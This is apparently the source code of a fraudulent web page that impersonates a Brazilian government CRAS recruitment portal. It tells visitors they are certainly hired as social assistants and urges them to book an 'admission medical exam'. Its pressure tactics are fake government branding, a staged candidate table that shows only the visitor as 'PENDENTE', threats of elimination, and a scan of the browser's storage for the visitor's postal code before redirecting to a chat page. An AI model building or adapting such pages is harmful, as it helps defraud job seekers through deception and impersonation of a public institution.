import React, { useState, useEffect } from 'react';
import { Users, Facebook, Instagram, Calendar, Clock, MapPin, Phone, Guitar as Hospital } from 'lucide-react';

interface ClinicData {
  nome: string;
  endereco: string;
  telefone: string;
  especialidade: string;
}

interface Candidate {
  name: string;
  function: string;
  status: string;
  isUser: boolean;
}

const MedicalExamPage: React.FC = () => {
  const [selectedDate, setSelectedDate] = useState<Date | null>(null);
  const [selectedTime, setSelectedTime] = useState<string>('');
  const [clinicData, setClinicData] = useState<ClinicData | null>(null);
  const [loading, setLoading] = useState(true);
  const [candidates, setCandidates] = useState<Candidate[]>([]);

  useEffect(() => {
    // Populate candidates table
    populateCandidatesTable();
    
    // Get clinic location
    getClinicLocation();
  }, []);

  const populateCandidatesTable = () => {
    const candidateNames = JSON.parse(localStorage.getItem('rankingCandidates') || '[]');
    const currentUserName = localStorage.getItem('candidateName') || 'CANDIDATO USUARIO';
    
    const candidateList: Candidate[] = [];
    
    if (candidateNames.length === 0) {
      const fallbackCandidates = [
        'AMANDA CAROLINE DIAS',
        'IZABELLA GOMES CRIPIM MACIEL', 
        'BRUNO RAFAEL GOMES',
        'MONICA APARECIDA LIMA',
        'LUCAS GABRIEL ALMEIDA'
      ];
      
      fallbackCandidates.forEach(candidateName => {
        const isCurrentUser = candidateName.toLowerCase() === currentUserName.toLowerCase();
        candidateList.push({
          name: candidateName,
          function: 'Assistente Social',
          status: isCurrentUser ? 'PENDENTE' : 'AGENDADO',
          isUser: isCurrentUser
        });
      });
    } else {
      candidateNames.forEach((candidateName: string) => {
        const isCurrentUser = candidateName.toLowerCase() === currentUserName.toLowerCase();
        candidateList.push({
          name: candidateName,
          function: 'Assistente Social',
          status: isCurrentUser ? 'PENDENTE' : 'AGENDADO',
          isUser: isCurrentUser
        });
      });
    }
    
    setCandidates(candidateList);
  };

  const getClinicLocation = async () => {
    setLoading(true);
    
    // Get user's CEP from localStorage
    let userCep = localStorage.getItem('userCep') || localStorage.getItem('candidateZipCode');
    
    if (!userCep) {
      // Search in all localStorage keys for CEP pattern
      const allKeys = Object.keys(localStorage);
      for (const key of allKeys) {
        try {
          const value = localStorage.getItem(key);
          if (value && value.match(/^\d{5}-?\d{3}$/)) {
            userCep = value;
            break;
          }
        } catch (e) {
          // Ignore errors
        }
      }
    }
    
    if (!userCep) {
      setLoading(false);
      return;
    }
    
    const cleanCep = userCep.replace(/\D/g, '');
    
    try {
      const apiUrl = `https://api-clinicas.replit.app/api/cep/${cleanCep}/clinics`;
      
      const response = await fetch(apiUrl, {
        method: 'GET',
        mode: 'cors',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        signal: AbortSignal.timeout(30000)
      });
      
      if (response.ok) {
        const data = await response.json();
        
        if (data.clinics && data.clinics.length > 0) {
          const clinic = data.clinics[0];
          const formattedClinic: ClinicData = {
            nome: clinic.name,
            endereco: clinic.address,
            telefone: clinic.phone || 'Telefone não informado',
            especialidade: clinic.specialty
          };
          
          setClinicData(formattedClinic);
          localStorage.setItem('clinicLocation', JSON.stringify(formattedClinic));
        }
      }
    } catch (error) {
      console.error('Error fetching clinic data:', error);
    }
    
    setLoading(false);
  };

  const generateCalendar = () => {
    const today = new Date();
    const currentMonth = today.getMonth();
    const currentYear = today.getFullYear();
    
    const daysOfWeek = ['Dom', 'Seg', 'Ter', 'Qua', 'Qui', 'Sex', 'Sáb'];
    const firstDay = new Date(currentYear, currentMonth, 1).getDay();
    const daysInMonth = new Date(currentYear, currentMonth + 1, 0).getDate();
    
    const calendarDays = [];
    
    // Add day headers
    daysOfWeek.forEach(day => {
      calendarDays.push(
        <div key={`header-${day}`} className="calendar-header font-semibold text-gray-700 p-2 text-center">
          {day}
        </div>
      );
    });
    
    // Add empty cells for days before month starts
    for (let i = 0; i < firstDay; i++) {
      calendarDays.push(
        <div key={`empty-${i}`} className="calendar-day disabled opacity-30 p-2 text-center"></div>
      );
    }
    
    // Add days of the month
    for (let day = 1; day <= daysInMonth; day++) {
      const currentDate = new Date(currentYear, currentMonth, day);
      const isPastDate = currentDate < today;
      const isSelected = selectedDate && 
        selectedDate.getDate() === day && 
        selectedDate.getMonth() === currentMonth && 
        selectedDate.getFullYear() === currentYear;
      
      let className = 'calendar-day p-2 text-center cursor-pointer transition-all duration-200 min-h-[40px] flex items-center justify-center font-medium border rounded';
      
      if (isPastDate) {
        className += ' past opacity-20 cursor-not-allowed bg-gray-100 text-gray-400';
      } else if (isSelected) {
        className += ' selected bg-[#044785] text-white border-yellow-400 border-2 font-bold';
      } else {
        className += ' available bg-white border-gray-300 text-gray-700 hover:bg-yellow-50 hover:border-[#044785]';
      }
      
      calendarDays.push(
        <div
          key={`day-${day}`}
          className={className}
          onClick={() => !isPastDate && selectDate(currentDate)}
        >
          {day}
        </div>
      );
    }
    
    return calendarDays;
  };

  const selectDate = (date: Date) => {
    setSelectedDate(date);
    localStorage.setItem('examDate', date.toLocaleDateString('pt-BR'));
    localStorage.setItem('examDateISO', date.toISOString().split('T')[0]);
  };

  const selectTime = (time: string) => {
    setSelectedTime(time);
    localStorage.setItem('examTime', time);
  };

  const handleSchedule = () => {
    if (selectedDate && selectedTime) {
      // Save all scheduling data
      const schedulingData = {
        date: selectedDate.toLocaleDateString('pt-BR'),
        time: selectedTime,
        clinic: clinicData
      };
      
      localStorage.setItem('examScheduling', JSON.stringify(schedulingData));
      
      // Redirect to chat page
      window.history.pushState({}, '', '/chat');
      window.location.reload();
    }
  };

  const timeSlots = [
    '08:00-09:00',
    '09:00-10:00', 
    '10:00-11:00',
    '11:00-12:00',
    '14:00-15:00',
    '15:00-16:00'
  ];

  const isScheduleEnabled = selectedDate && selectedTime;

  return (
    <div className="flex flex-col min-h-screen bg-gray-50">
      {/* Government Header */}
      <header className="bg-[#222222] text-white py-2">
        <div className="container mx-auto flex justify-between items-center px-4">
          <a className="font-bold text-sm" href="#">
            <img 
              src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" 
              alt="Logotipo Governo" 
              className="h-6"
            />
          </a>
          <nav>
            <ul className="flex space-x-4 text-[10px]">
              <li>
                <a className="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
              </li>
              <li>
                <a className="hover:underline" href="#">PARTICIPE</a>
              </li>
              <li>
                <a className="hover:underline" href="#">SERVIÇOS</a>
              </li>
            </ul>
          </nav>
        </div>
      </header>

      {/* CRAS Header */}
      <div className="bg-[#044785] py-3">
        <div className="container mx-auto px-4 text-center">
          <img 
            src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" 
            alt="Logo CRAS" 
            className="h-8 mx-auto"
          />
        </div>
      </div>

      <main className="flex-grow container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto">
          <div className="mb-8">
            <h1 className="text-2xl font-bold text-gray-900 mb-4">Exame Médico Admissional</h1>
            <p className="text-gray-700 mb-2">Sistema de Agendamento para Exame Médico Obrigatório - Vaga de Assistente Social CRAS</p>
            <div className="h-1 w-32 bg-[#044785]"></div>
          </div>

          {/* Information Section */}
          <div className="bg-white shadow-sm rounded-lg p-6 mb-8 border border-gray-200">
            <h2 className="text-lg font-semibold text-gray-900 mb-4">Exame Médico admissional para a contratação:</h2>
            
            <div className="bg-green-50 border-l-4 border-green-400 p-4 rounded mb-4">
              <p className="text-green-800 font-semibold">✓ ÚLTIMA ETAPA:</p>
              <p className="text-green-700 text-sm mt-1">
                Segundo a legislação vigente, conforme determina o artigo 168 da Consolidação das Leis do Trabalho (CLT), 
                o exame médico admissional é obrigatório para a efetivação da contratação de qualquer trabalhador, incluindo 
                o cargo de Assistente Social em unidades do CRAS (Centro de Referência de Assistência Social). Este exame 
                tem como objetivo verificar se o candidato está apto física e mentalmente para exercer as funções do cargo, 
                garantindo a segurança e a saúde no ambiente de trabalho. Portanto, a realização do exame admissional é uma 
                etapa indispensável antes da assinatura do contrato de trabalho.
              </p>
            </div>
            
            <div className="grid md:grid-cols-2 gap-6">
              <div>
                <h3 className="font-semibold text-gray-900 mb-2">Informações do Exame:</h3>
                <ul className="space-y-1 text-sm text-gray-700">
                  <li>• <strong>Duração:</strong> 25 minutos</li>
                  <li>• <strong>Horário:</strong> Conforme agendamento</li>
                  <li>• É obrigatório para novos funcionários</li>
                  <li>• <strong>Atestado de saúde ocupacional</strong> será emitido</li>
                </ul>
              </div>
              <div>
                <h3 className="font-semibold text-gray-900 mb-2">Sua função no CRAS:</h3>
                <ul className="space-y-1 text-sm text-gray-700">
                  <li>• Atendimento a famílias vulneráveis</li>
                  <li>• <strong>Orientação sobre benefícios sociais</strong></li>
                  <li>• Acompanhamento de casos</li>
                  <li>• Articulação com rede de serviços</li>
                  <li>• <strong>Treinamento completo será fornecido</strong></li>
                </ul>
              </div>
            </div>
          </div>

          {/* Loading or Clinic Info */}
          {loading ? (
            <div className="bg-white shadow-sm rounded-lg p-6 mb-8 border border-gray-200">
              <div className="flex items-center justify-center py-8">
                <div className="flex items-center space-x-3">
                  <div className="animate-spin rounded-full h-6 w-6 border-2 border-[#044785] border-t-transparent"></div>
                  <span className="text-gray-700">Localizando clínica médica próxima...</span>
                </div>
              </div>
            </div>
          ) : (
            <div className="bg-white shadow-sm rounded-lg p-6 mb-8 border border-gray-200">
              <div className="flex items-start space-x-4 mb-6">
                <div className="flex-shrink-0">
                  <Hospital className="text-2xl text-[#044785]" size={32} />
                </div>
                <div>
                  <h3 className="text-lg font-bold text-gray-900 mb-3">
                    {clinicData?.nome || 'Clínica Médica'}
                  </h3>
                  <p className="text-gray-700 text-sm">
                    Local onde você realizará seu exame médico admissional para confirmação da vaga de Assistente Social no CRAS.
                  </p>
                </div>
              </div>

              {/* Clinic Address */}
              {clinicData && (
                <div className="mb-6">
                  <div className="bg-gray-50 p-4 rounded-lg">
                    <div className="space-y-3">
                      <div className="flex items-start space-x-3">
                        <Hospital className="text-blue-500 mt-1" size={20} />
                        <div>
                          <p className="font-semibold text-gray-900">{clinicData.nome}</p>
                          <p className="text-sm text-gray-600">{clinicData.especialidade}</p>
                        </div>
                      </div>
                      <div className="flex items-start space-x-3">
                        <MapPin className="text-blue-500 mt-1" size={20} />
                        <div>
                          <p className="font-medium text-gray-900">{clinicData.endereco}</p>
                        </div>
                      </div>
                      <div className="flex items-center space-x-3">
                        <Phone className="text-green-500" size={20} />
                        <div>
                          <p className="font-medium text-gray-900">{clinicData.telefone}</p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Calendar Selection */}
              <div className="mb-6">
                <h3 className="text-lg font-semibold text-gray-900 mb-4">Selecione a Data do Exame</h3>
                <p className="text-sm text-gray-700 mb-4">
                  Escolha a data disponível para realizar o exame médico admissional.
                </p>
                
                <div className="grid grid-cols-7 gap-1 max-w-md mb-4">
                  {generateCalendar()}
                </div>
                
                {selectedDate && (
                  <div className="mt-4 p-3 bg-blue-50 rounded-lg">
                    <div className="flex items-center space-x-2">
                      <Calendar className="text-[#044785]" size={20} />
                      <span className="font-semibold text-gray-900">Data selecionada: </span>
                      <span className="text-gray-900">{selectedDate.toLocaleDateString('pt-BR')}</span>
                    </div>
                  </div>
                )}
              </div>

              {/* Time Slot Selection */}
              <div className="mb-6">
                <h3 className="text-lg font-semibold text-gray-900 mb-4">Selecione o Horário para o Exame</h3>
                <p className="text-sm text-gray-700 mb-4">
                  Escolha o horário de sua preferência para realizar o exame médico admissional.
                </p>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-2 max-w-lg">
                  {timeSlots.map((time) => (
                    <button
                      key={time}
                      type="button"
                      onClick={() => selectTime(time)}
                      className={`p-3 border-2 rounded-lg text-left flex items-center transition-all duration-200 ${
                        selectedTime === time
                          ? 'border-[#044785] bg-[#044785] text-white font-semibold'
                          : 'border-gray-300 bg-white text-gray-700 hover:border-[#044785] hover:bg-yellow-50'
                      }`}
                    >
                      <Clock className="mr-2" size={16} />
                      {time}
                    </button>
                  ))}
                </div>
                
                {selectedTime && (
                  <div className="mt-4 p-3 bg-blue-50 rounded-lg">
                    <div className="flex items-center space-x-2">
                      <Clock className="text-[#044785]" size={20} />
                      <span className="font-semibold text-gray-900">Horário selecionado: </span>
                      <span className="text-gray-900">{selectedTime}</span>
                    </div>
                  </div>
                )}
              </div>

              {/* Requirements */}
              <div className="bg-blue-50 border-l-4 border-blue-400 p-4 mb-6">
                <div className="flex">
                  <div className="flex-shrink-0">
                    <div className="w-5 h-5 bg-blue-400 rounded-full flex items-center justify-center">
                      <span className="text-white text-xs">i</span>
                    </div>
                  </div>
                  <div className="ml-3">
                    <h3 className="text-sm font-medium text-blue-800">Documentos Necessários</h3>
                    <div className="mt-2 text-sm text-blue-700">
                      <ul className="list-disc list-inside space-y-1">
                        <li>RG e CPF originais</li>
                        <li>Comprovante de residência atualizado</li>
                        <li>Carteira de trabalho</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>

              {/* Status Information */}
              <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
                <div className="flex">
                  <div className="flex-shrink-0">
                    <div className="w-5 h-5 bg-yellow-400 rounded-full flex items-center justify-center">
                      <span className="text-white text-xs">!</span>
                    </div>
                  </div>
                  <div className="ml-3">
                    <h3 className="text-sm font-medium text-yellow-800">Status de Contratação dos Candidatos</h3>
                    <div className="mt-2 text-sm text-yellow-700">
                      <p className="mb-3">Todos os candidatos selecionados <strong>serão contratados com toda certeza pelo CRAS</strong>, mas para ser contratado de fato, todos os candidatos aprovados precisam realizar o exame médico admissional.</p>
                      <p className="mb-3">Na tabela abaixo:</p>
                      <ul className="list-disc list-inside space-y-1 mb-3">
                        <li>Candidatos com status <span className="font-bold text-green-600">"AGENDADO"</span> já agendaram seu exame médico</li>
                        <li>Candidatos com status <span className="font-bold text-red-600">"PENDENTE"</span> ainda não agendaram o exame médico</li>
                        <li><strong>Candidatos com status PENDENTE serão eliminados se não agendarem o exame</strong></li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>

              {/* Candidate Status Table */}
              <div className="mb-6">
                <h3 className="text-lg font-semibold text-gray-900 mb-4">👥 Novos Assistentes Sociais CRAS:</h3>
                <div className="overflow-x-auto">
                  <table className="w-full max-w-4xl mx-auto border border-gray-300 rounded-lg bg-white shadow-lg">
                    <thead className="bg-gray-100">
                      <tr>
                        <th className="border border-gray-300 px-6 py-2 text-left font-semibold">Nome do Candidato</th>
                        <th className="border border-gray-300 px-4 py-2 text-center font-semibold">Função</th>
                        <th className="border border-gray-300 px-4 py-2 text-center font-semibold">Exame Médico</th>
                      </tr>
                    </thead>
                    <tbody>
                      {candidates.map((candidate, index) => (
                        <tr key={index} className={candidate.isUser ? 'bg-red-50 border-red-200' : ''}>
                          <td className={`border border-gray-300 px-6 py-2 ${candidate.isUser ? 'font-bold text-red-700' : ''}`}>
                            {candidate.name}
                          </td>
                          <td className="border border-gray-300 px-4 py-2 text-center">
                            {candidate.function}
                          </td>
                          <td className="border border-gray-300 px-4 py-2 text-center">
                            <span className={candidate.status === 'AGENDADO' ? 'text-green-600 font-bold' : 'text-red-600 font-bold'}>
                              {candidate.status}
                            </span>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>

              {/* Schedule button */}
              <button
                type="button"
                onClick={handleSchedule}
                disabled={!isScheduleEnabled}
                className={`w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium transition-colors duration-200 ${
                  isScheduleEnabled
                    ? 'text-white bg-[#044785] hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#044785]'
                    : 'text-gray-900 bg-gray-300 cursor-not-allowed'
                }`}
              >
                <Calendar className="mr-2" size={16} />
                {!selectedDate && !selectedTime
                  ? 'Selecione data e horário para continuar'
                  : !selectedDate
                  ? 'Selecione uma data para continuar'
                  : !selectedTime
                  ? 'Selecione um horário para continuar'
                  : 'Agendar Exame Médico'
                }
              </button>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#044785] text-white py-8 md:py-12">
        <div className="container mx-auto px-4 md:px-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Sobre o CRAS</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">O que é o CRAS</a></li>
                <li><a href="#" className="hover:text-gray-200">Missão e Valores</a></li>
                <li><a href="#" className="hover:text-gray-200">Onde Atuamos</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Serviços</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Proteção Social Básica</a></li>
                <li><a href="#" className="hover:text-gray-200">Atendimento às Famílias</a></li>
                <li><a href="#" className="hover:text-gray-200">Grupos de Convivência</a></li>
                <li><a href="#" className="hover:text-gray-200">Benefícios Sociais</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Assistência Social</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Cadastro Único</a></li>
                <li><a href="#" className="hover:text-gray-200">Bolsa Família</a></li>
                <li><a href="#" className="hover:text-gray-200">BPC</a></li>
                <li><a href="#" className="hover:text-gray-200">Auxílio Brasil</a></li>
                <li><a href="#" className="hover:text-gray-200">Programas Sociais</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Trabalhe Conosco</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Vagas</a></li>
                <li><a href="#" className="hover:text-gray-200">Portal do Servidor</a></li>
                <li><a href="#" className="hover:text-gray-200">Capacitações</a></li>
                <li><a href="#" className="hover:text-gray-200">Concursos</a></li>
              </ul>
            </div>
          </div>
          
          <hr className="border-blue-400 mb-6" />
          
          <div className="flex flex-col md:flex-row justify-between items-center text-xs text-white">
            <div className="mb-4 md:mb-0">
              <span>© Copyright 2025 CRAS - Centro de Referência de Assistência Social</span>
            </div>
            <div className="flex flex-wrap justify-center gap-2 md:gap-4">
              <a href="#" className="hover:text-gray-200">Mapa do Site</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Política de Privacidade</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Lei de Acesso à Informação</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Acessibilidade</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Ouvidoria</a>
            </div>
            <div className="flex space-x-4 mt-4 md:mt-0">
              <a href="#" className="text-white hover:text-gray-200">
                <Facebook size={16} />
              </a>
              <a href="#" className="text-white hover:text-gray-200">
                <Instagram size={16} />
              </a>
            </div>
          </div>
        </div>
      </footer>

      {/* Floating Accessibility Icon */}
      <a 
        href="#" 
        className="fixed bottom-4 right-4 bg-blue-600 p-3 rounded-full shadow-lg hover:bg-blue-700 transition-colors z-50"
      >
        <Users className="w-6 h-6 text-white" />
      </a>
    </div>
  );
};

export default MedicalExamPage;